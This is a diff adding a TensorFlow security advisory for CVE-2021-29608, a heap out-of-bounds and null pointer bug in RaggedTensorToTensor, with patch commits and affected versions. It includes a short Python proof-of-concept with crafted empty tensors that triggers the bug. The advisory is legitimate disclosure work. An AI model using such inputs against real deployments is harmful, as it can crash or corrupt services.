@@ -1,0 +1,42 @@
+<h2>TFSA-2021-095: Heap OOB and null pointer dereference in <code>RaggedTensorToTensor</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29608</p>
+<h3>Impact</h3>
+<p>Due to lack of validation in <code>tf.raw_ops.RaggedTensorToTensor</code>, an attacker can
+exploit an undefined behavior if input arguments are empty:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>shape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)
+values = tf.constant([], shape=[0], dtype=tf.int64)
+default_value = tf.constant(404, dtype=tf.int64)
+row = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)
+rows = [row]
+types = ['ROW_SPLITS']</p>
+<p>tf.raw_ops.RaggedTensorToTensor(
+  shape=shape, values=values, default_value=default_value,
+  row_partition_tensors=rows, row_partition_types=types)
+```</p>
+<p>The
+<a href="https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L356-L360">implementation</a>
+only checks that one of the tensors is not empty, but does not check for the
+other ones.</p>
+<p>There are multiple <code>DCHECK</code> validations to prevent heap OOB, but these are no-op
+in release builds, hence they don't prevent anything.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/b761c9b652af2107cfbc33efd19be0ce41daa33e">b761c9b652af2107cfbc33efd19be0ce41daa33e</a>
+followed by GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/f94ef358bb3e91d517446454edff6535bcfe8e4a">f94ef358bb3e91d517446454edff6535bcfe8e4a</a>
+and GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/c4d7afb6a5986b04505aca4466ae1951686c80f6">c4d7afb6a5986b04505aca4466ae1951686c80f6</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick these
+commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
